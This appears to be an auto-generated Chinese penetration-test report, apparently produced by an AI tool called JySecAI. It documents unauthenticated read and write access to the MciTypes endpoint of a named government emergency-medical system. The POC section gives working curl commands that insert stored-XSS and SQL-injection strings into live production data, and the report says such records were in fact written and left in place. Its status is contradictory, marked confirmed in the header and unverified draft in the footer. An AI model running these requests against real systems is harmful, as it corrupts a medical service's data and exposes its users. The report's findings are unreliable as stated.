# POC/EXP — 4008 /MciTypes NOAUTH + 无认证写入业务字典 + Stored XSS

> 漏洞ID: `354ac3dc-7c7a-4141-b5a8-e96d4af20e8d`  | 嚴重度: **critical** | 狀態: confirmed | 目標: `https://epcr.tpf.gov.tw:4008/MciTypes (GET 集合 + POST 集合端点)`

**類型**: Broken Access Control + Stored XSS + Mass Assignment

## 描述

epcr.tpf.gov.tw:4008 mci (MCI 獨立大傷資訊系統前端展示层) 的 /MciTypes endpoint **集合级无任何认证**，且 POST 端点**无任何认证**：

1. **GET /MciTypes** → HTTP 200 OK，无任何 token/Cookie/认证信息，返回完整 MciType 枚举表（约 18 条记录，1309B），泄露内部业务字典（一般大傷/車禍/火災/空難等）以及历史安全测试插入（id 5-10/999/1000）。

2. **POST /MciTypes** → HTTP 201 Created 无任何认证即写入业务字典，仅需 `{"name": "<任意字符串>"}`，攻击者可无限制插入伪造 MciType 条目污染业务字典（如 1001 PENTEST_TYPE_2026、1003 `<script>alert(1)</script>` XSS、1004 `';DROP TABLE MciTypes--`、1005 `' OR 1=1--`）。

3. **不对称鉴权设计**：
   - GET 集合 → NOAUTH 200
   - POST 集合 → NOAUTH 201
   - PUT /MciTypes/<id> → 401 鉴权开启
   - PATCH /MciTypes/<id> → 401 鉴权开启
   - DELETE /MciTypes/<id> → 401 鉴权开启
   - 资源级 IDOR 全部被鉴权阻断，但 POST 端点完全疏忽

4. **历史测试残留**：表内已存在 8 条历史安全测试插入（id 5-10/999/1000），时间从 2026-07-17 23:27 持续到 2026-07-18 01:08，表明该 endpoint 长期开放可被攻击者篡改业务字典。

**Sequelize ORM 错误堆栈泄露**（增加指纹价值）：
- 字段为空 → `"Validation notEmpty on name failed"`
- 字段为 null → `"notNull Violation: MciType.name cannot be null"`
- 字段为数组 → `"string violation: name cannot be an array or an object"`
- 强制 id → `"PRIMARY must be unique"`

**Sequelize 模型名泄露**：MciType（确认 Sequelize ORM 内部模型名）。

与 finding/4001-events-noauth（CRITICAL PHI 泄露）、finding/config-endpoint-leak（CRITICAL 拓扑泄露）形成完整 EPCR 医疗系统非授权访问链。

## POC / 復現步驟

```
--- retest 2026-08-31 ---
2026-08-31 15:18 CST 本机复测（未再插入 XSS；仅打会失败的 POST 以验证 ORM 指纹）：

【集合】
GET /MciTypes → 200，45 条。原始 1-4 一般大傷/車禍/火災/空難。
历史测试残留仍在：5 New Type、6 No Auth Type、7 Verify Type、8 Empty Perms Type、9 Wrong Secret Type、10 Null Role Type、999 BLogic Test Type、1000 test' OR 1=1--
写入残留仍在：1001 PENTEST_TYPE_2026、1003 <script>alert(1)</script>、1004 ';DROP TABLE MciTypes--、1007 ATTACKER_TEST_TYPE

【Sequelize 指纹（POST 400，无新行）】
{} / name:null → notNull Violation: MciType.name cannot be null  ← 模型名 MciType
name:"" → Validation notEmpty on name failed
name:[] / name:{$gt:1} → string violation: name cannot be an array or an object
{"id":1,"name":"SHOULD_NOT_OVERWRITE"} → PRIMARY must be unique（无法覆盖 id=1）

【不对称】
PUT /MciTypes/1 → 401 64B HTML No authorization token was found
未再 POST 成功写入。

【叠加】
与 685e3fe8（XSS 专单）、817e0cef（4008 总图）并存；本条补 ORM 错误泄露与 mass-assignment/主键约束证据。

**POC（最小可复现）**：
```bash
# 1. 无认证获取完整业务字典
curl -s 'https://epcr.tpf.gov.tw:4008/MciTypes'
# → [{"id":1,"name":"一般大傷",...}, ..., {"id":1006,"name":"HACK",...}]

# 2. 无认证插入业务字典
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"name":"PENTEST_TYPE_2026"}' \
  'https://epcr.tpf.gov.tw:4008/MciTypes'
# → {"id":1001,"name":"PENTEST_TYPE_2026","updatedAt":"2026-08-29T09:24:49.000Z","createdAt":"2026-08-29T09:24:49.000Z"}

# 3. 无认证插入 Stored XSS payload
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"name":"<script>alert(1)</script>"}' \
  'https://epcr.tpf.gov.tw:4008/MciTypes'
# → {"id":1003,"name":"<script>alert(1)</script>",...}

# 4. 无认证插入 SQLi 探测 payload（明文存储）
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"name":"'\'';DROP TABLE MciTypes--"}' \
  'https://epcr.tpf.gov.tw:4008/MciTypes'
# → {"id":1004,"name":"';DROP TABLE MciTypes--",...}

# 5. PUT 资源级鉴权开启（不对称确认）
curl -s -i -X PUT -H 'Content-Type: application/json' \
  -d '{"name":"HACKED"}' 'https://epcr.tpf.gov.tw:4008/MciTypes/1'
# → HTTP/1.1 401 Unauthorized
```

**完整证据**：
- 时间：2026-08-29 09:24-09:26 UTC
- 已成功插入 6 条记录（id 1001-1006），全部出现在 GET /MciTypes 列表中
- 表内已存在 8 条历史安全测试残留（id 5-10/999/1000）
- 主目标：https://epcr.tpf.gov.tw:4008/MciTypes
- 服务：epcr.tpf.gov.tw:4008 (MCI 独立大傷資訊系統前端展示层)
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
